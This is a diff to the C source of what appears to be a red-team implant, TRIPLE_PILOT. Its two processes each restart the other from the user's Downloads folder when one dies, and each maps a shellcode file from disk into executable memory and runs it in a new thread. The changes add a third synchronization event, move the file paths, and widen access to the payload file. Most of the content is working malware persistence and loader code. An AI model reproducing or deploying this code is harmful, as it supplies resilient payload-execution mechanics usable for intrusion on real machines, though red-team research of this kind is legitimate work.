@@ -15,13 +15,15 @@
 #include "libDebug.h"
 #include "libMem.h"
 
-#define SHELLCODE_FILEW L"D:\\pay2.dat"
+#define IMPLANT_LOCATION L"C:\\Users\\redteam\\Downloads\\TRIPLE_PILOT.exe"
+#define SHELLCODE_FILEW L"C:\\Users\\redteam\\Downloads\\payload.dat"
 #define SHELLCODE_MAP L"payload"
 // TODO: These should be replaced with GUIDs
 #define MUTEX_NAME L"Global\\procA"
+#define MUTEXB_NAME L"Global\\procB"
 #define EVENTA_NAME L"Global\\aEvent"
-#define EVENTA_THREAD_NAME L"Global\\a_thread_event"
 #define EVENTB_NAME L"Global\\bEvent"
+#define EVENTC_NAME L"Global\\cEvent"
 #define SHARED_NAME L"Global\\procAshare"
 
 int startAndMonitorPartner(){
@@ -51,13 +53,14 @@ int startAndMonitorPartner(){
 				// Start the partner process
 				DPRINT("Proc B is dead. I will make a new Proc B.\n");
 				retVal = CreateProcessW(
-					L"D:\\TRIPLE_P.exe",
+					IMPLANT_LOCATION,
 					NULL,//L"D:\\pay.dat",
 					NULL,
 					NULL,
 					TRUE,
 					0,
 					NULL,
+
 					NULL,
 					&si,
 					&pi
@@ -184,6 +187,7 @@ int main(){
 	
 	HANDLE aEvent = NULL;
 	HANDLE bEvent = NULL;
+	HANDLE cEvent = NULL;
 	HANDLE procA = NULL;
 	unsigned long waitResult = 0;
 	int whoAmI = 0;
@@ -204,6 +208,9 @@ int main(){
 
 	bEvent = CreateEventW(NULL, FALSE, FALSE, EVENTB_NAME);
 	CHECK_RETVAL_GLE(retVal, "CreateEvent", bEvent, NULL);
+
+	cEvent = CreateEventW(NULL, FALSE, FALSE, EVENTC_NAME);
+	CHECK_RETVAL_GLE(retVal, "CreateEvent", cEvent, NULL);
 
 	while(TRUE){
 	// Try and determine which process this will be
@@ -241,7 +248,7 @@ int main(){
 			// TODO: Add code to attempt to get an exclusive handle to protect the file
 			shellcodeFile = CreateFileW(
 				SHELLCODE_FILEW,
-				GENERIC_READ | GENERIC_EXECUTE,
+				GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE,
 				FILE_SHARE_READ,
 				NULL,
 				OPEN_EXISTING,
@@ -293,7 +300,7 @@ int main(){
 				CHECK_RETVAL_GLE(retVal, "MapViewOfFile", shellcodeView, NULL);
 
 				implantHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runPayload, (char*) shellcodeView, 0, 0);// runPayload((char*) shellcodeView, &implantHandle);
-				CHECK_RETVAL(retVal, runPayload);
+				CHECK_RETVAL_GLE(retVal, "CreateThread", implantHandle, NULL);
 
 				DPRINT("Orchestrate\n");
 				retVal = SetEvent(bEvent);
@@ -317,6 +324,7 @@ CLEANUP:
 	SAFE_CLOSEHANDLE(procA);
 	SAFE_CLOSEHANDLE(aEvent);
 	SAFE_CLOSEHANDLE(bEvent);
+	SAFE_CLOSEHANDLE(cEvent);
 
     return retVal;
 };
